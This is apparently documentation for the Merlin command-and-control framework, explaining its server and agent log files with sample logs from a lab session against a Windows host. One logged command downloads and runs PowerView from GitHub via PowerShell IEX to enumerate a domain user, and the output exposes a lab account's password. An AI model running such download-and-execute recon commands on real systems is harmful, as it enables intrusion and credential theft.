#######
Logging
#######

Server
------

Merlin creates a log of server activities that are saved at ``data/log/merlinServerLog.txt``.
An example of the server log file:

.. code-block:: html

    [2017-12-17 03:25:31.601752218 +0000 UTC m=+0.001463384]Starting Merlin Server
    [2017-12-17 03:25:31.609125184 +0000 UTC m=+0.008836420]Starting HTTP/2 Listener
    [2017-12-17 03:25:31.609148289 +0000 UTC m=+0.008859410]Address: 0.0.0.0:443/
    [2017-12-17 03:25:31.609156804 +0000 UTC m=+0.008867860]x.509 Certificate /opt/merlin/data/x509/server.crt
    [2017-12-17 03:25:31.609163552 +0000 UTC m=+0.008874620]x.509 Key /opt/merlin/data/x509/server.key
    [2017-12-17 03:26:07.101079056 +0000 UTC m=+35.500790466]Received new agent checkin from 209342db-ce7c-49e8-883f-0ee4da7d266d
    [2017-12-17 03:26:11.560452462 +0000 UTC m=+39.960164571]Received new agent checkin from 6e5e8a3b-42fd-4129-8f02-be04b935d252
    [2017-12-17 03:26:18.078416725 +0000 UTC m=+46.478128025]Received new agent checkin from 13c8bd9b-dc8e-4fa9-83d0-58c7cff8903d
    [2017-12-17 03:30:58.634935594 +0000 UTC m=+327.034647953]Shutting down Merlin Server due to user input


Agent
-----

When an agent checks in to Merlin, a directory is created for it based on the Agent's UUID in the ``data/agents`` directory. A log file of agent activity is created in the new directory in the ``agent_log.txt`` file.

An example of the ``data/agents/209342db-ce7c-49e8-883f-0ee4da7d266d/agent_log.txt`` file:

.. code-block:: html

    [2017-12-17 03:26:07.10226105 +0000 UTC m=+35.501972326]Initial check in for agent 209342db-ce7c-49e8-883f-0ee4da7d266d
    [2017-12-17 03:26:07.10246555 +0000 UTC m=+35.502176856]Platform: windows
    [2017-12-17 03:26:07.10249271 +0000 UTC m=+35.502203956]Architecture: amd64
    [2017-12-17 03:26:07.10256092 +0000 UTC m=+35.502272320]HostName: WIN10
    [2017-12-17 03:26:07.102590307 +0000 UTC m=+35.502301630]UserName: XCALIBUR\dade
    [2017-12-17 03:26:07.102640064 +0000 UTC m=+35.502351353]UserGUID: S-1-5-21-4268310007-4003891068-3852045410-513
    [2017-12-17 03:26:07.10265651 +0000 UTC m=+35.502367750]Process ID: 2776
    [2017-12-17 03:26:07.132149253 +0000 UTC m=+35.531861089]Processing AgentInfo message:
            Agent Version: 0.1.3
            Agent Build: 6a1723b180583deff56b41a9d2a283244837b611
            Agent waitTime: 30s
            Agent paddingMax: 4096
            Agent maxRetry: 7
            Agent failedCheckin: 0
    [2017-12-17 03:26:37.254087469 +0000 UTC m=+65.653799302]Agent status check in
    [2017-12-17 03:27:07.395670309 +0000 UTC m=+95.795382065]Agent status check in
    [2017-12-17 03:27:37.533895458 +0000 UTC m=+125.933607084]Agent status check in
    [2017-12-17 03:27:37.537462734 +0000 UTC m=+125.937175076]Command Type: control
    [2017-12-17 03:27:37.537593821 +0000 UTC m=+125.937305610]Command: [sleep 13s]
    [2017-12-17 03:27:37.537786944 +0000 UTC m=+125.937498617]Created job vPIDreMwkF for agent 209342db-ce7c-49e8-883f-0ee4da7d266d
    [2017-12-17 03:27:37.571990967 +0000 UTC m=+125.971702752]Processing AgentInfo message:
            Agent Version: 0.1.3
            Agent Build: 6a1723b180583deff56b41a9d2a283244837b611
            Agent waitTime: 13s
            Agent paddingMax: 4096
            Agent maxRetry: 7
            Agent failedCheckin: 0
    [2017-12-17 03:27:50.69824483 +0000 UTC m=+139.097956473]Agent status check in
    [2017-12-17 03:28:03.822906318 +0000 UTC m=+152.222618134]Agent status check in
    [2017-12-17 03:28:03.824745772 +0000 UTC m=+152.224457054]Command Type: cmd
    [2017-12-17 03:28:03.824787835 +0000 UTC m=+152.224499144]Command: [powershell "Get-NetAdapter|fl"]
    [2017-12-17 03:28:03.824874938 +0000 UTC m=+152.224586324]Created job cwDwWifPqR for agent 209342db-ce7c-49e8-883f-0ee4da7d266d
    [2017-12-17 03:28:06.474940051 +0000 UTC m=+154.874651976]Results for job: cwDwWifPqR
    [2017-12-17 03:28:06.478391949 +0000 UTC m=+154.878103211]Command Results (stdout):


    Name                       : Ethernet0
    InterfaceDescription       : Intel(R) 82574L Gigabit Network Connection
    InterfaceIndex             : 9
    MacAddress                 : 00-0C-29-96-04-66
    MediaType                  : 802.3
    PhysicalMediaType          : 802.3
    InterfaceOperationalStatus : Up
    AdminStatus                : Up
    LinkSpeed(Gbps)            : 1
    MediaConnectionState       : Connected
    ConnectorPresent           : True
    DriverInformation          : Driver Date 2016-04-05 Version 12.15.22.6 NDIS 6.30


    [2017-12-17 03:28:19.614829305 +0000 UTC m=+168.014540881]Agent status check in
    [2017-12-17 03:28:32.748204051 +0000 UTC m=+181.147915670]Agent status check in
    [2017-12-17 03:28:32.750120781 +0000 UTC m=+181.149832134]Command Type: cmd
    [2017-12-17 03:28:32.750162232 +0000 UTC m=+181.149873581]Command: [powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetUser -Username dade"]
    [2017-12-17 03:28:32.750301452 +0000 UTC m=+181.150012674]Created job GMKxTcvWhH for agent 209342db-ce7c-49e8-883f-0ee4da7d266d
    [2017-12-17 03:28:35.105745057 +0000 UTC m=+183.505457853]Results for job: GMKxTcvWhH
    [2017-12-17 03:28:35.108203423 +0000 UTC m=+183.507915165]Command Results (stdout):


    logoncount                    : 12
    badpasswordtime               : 12/10/2017 9:08:24 AM
    description                   : Intentionally Vulnerable;Password: Winter2017
    distinguishedname             : CN=Dade D. Murphy,CN=Users,DC=xcalibur,DC=io
    objectclass                   : {top, person, organizationalPerson, user}
    dscorepropagationdata         : 1/1/1601 12:00:00 AM
    displayname                   : Dade D. Murphy
    lastlogontimestamp            : 12/10/2017 9:14:44 AM
    userprincipalname             : dade@xcalibur.io
    name                          : Dade D. Murphy
    primarygroupid                : 513
    objectsid                     : S-1-5-21-4268310007-4003891068-3852045410-1116
    samaccountname                : dade
    lastlogon                     : 12/16/2017 6:19:58 PM
    codepage                      : 0
    samaccounttype                : 805306368
    whenchanged                   : 12/10/2017 5:14:44 PM
    accountexpires                : 9223372036854775807
    cn                            : Dade D. Murphy
    adspath                       : LDAP://CN=Dade D. Murphy,CN=Users,DC=xcalibur,DC=io
    instancetype                  : 4
    objectguid                    : 662a2b05-8397-41d4-bfdb-b0bd6df3615b
    sn                            : Murphy
    lastlogoff                    : 12/31/1600 4:00:00 PM
    objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=xcalibur,DC=io
    initials                      : D
    givenname                     : Dade
    whencreated                   : 10/6/2017 12:21:27 AM
    badpwdcount                   : 0
    useraccountcontrol            : 66048
    usncreated                    : 12889
    countrycode                   : 0
    pwdlastset                    : 10/5/2017 5:21:27 PM
    msds-supportedencryptiontypes : 0
    usnchanged                    : 20645

    [2017-12-17 03:28:48.250330562 +0000 UTC m=+196.650042428]Agent status check in
    [2017-12-17 03:29:01.387319268 +0000 UTC m=+209.787031394]Agent status check in
    [2017-12-17 03:29:14.519431017 +0000 UTC m=+222.919142466]Agent status check in
    [2017-12-17 03:29:27.640031072 +0000 UTC m=+236.039742618]Agent status check in
    [2017-12-17 03:29:40.75826363 +0000 UTC m=+249.157975111]Agent status check in
    [2017-12-17 03:29:53.90008421 +0000 UTC m=+262.299796006]Agent status check in
    [2017-12-17 03:30:07.04774827 +0000 UTC m=+275.447460262]Agent status check in
    [2017-12-17 03:30:20.178747286 +0000 UTC m=+288.578458632]Agent status check in
    [2017-12-17 03:30:33.306429632 +0000 UTC m=+301.706141394]Agent status check in
    [2017-12-17 03:30:46.426827382 +0000 UTC m=+314.826539174]Agent status check in
    [2017-12-17 03:30:46.428641549 +0000 UTC m=+314.828352838]Command Type: kill
    [2017-12-17 03:30:46.428684456 +0000 UTC m=+314.828395838]Command: []
    [2017-12-17 03:30:46.428732519 +0000 UTC m=+314.828443952]Created job yRZdBkCXAf for agent 209342db-ce7c-49e8-883f-0ee4da7d266d
